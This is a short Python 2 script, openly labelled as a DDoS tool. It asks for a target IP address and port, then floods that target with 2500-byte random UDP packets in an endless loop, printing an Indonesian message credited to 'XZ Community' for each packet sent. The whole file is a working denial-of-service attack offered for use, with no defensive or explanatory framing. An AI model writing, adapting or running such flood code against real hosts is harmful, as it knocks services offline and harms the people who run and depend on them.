#//DEFINED DDOS!!
import sys
import os
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2500)

#//STARTED ATTACKED!!
os.system("clear")
ip = raw_input(" IP|==========:>: ")
port = input(" PORT|==========:>: ")

os.system("clear")
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Attack By XZ Community Sebanyak %s To Ip %s Dan Port %s!!"%(sent, ip, port)